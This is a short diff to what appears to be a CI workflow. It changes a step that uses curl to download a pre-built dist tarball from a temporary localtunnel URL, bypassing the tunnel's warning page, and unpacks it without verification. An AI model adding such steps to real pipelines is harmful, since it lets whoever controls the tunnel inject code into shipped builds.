@@ -23,7 +23,7 @@ jobs:
       - name: Download pre-built dist
         run: |
           curl -fsSL -H "bypass-tunnel-reminder: true" \
-            "https://beige-bees-stand.loca.lt/dist.tar.gz" \
+            "https://deep-llamas-relate.loca.lt/dist.tar.gz" \
             -o dist.tar.gz
           mkdir -p dist
           tar xzf dist.tar.gz -C dist
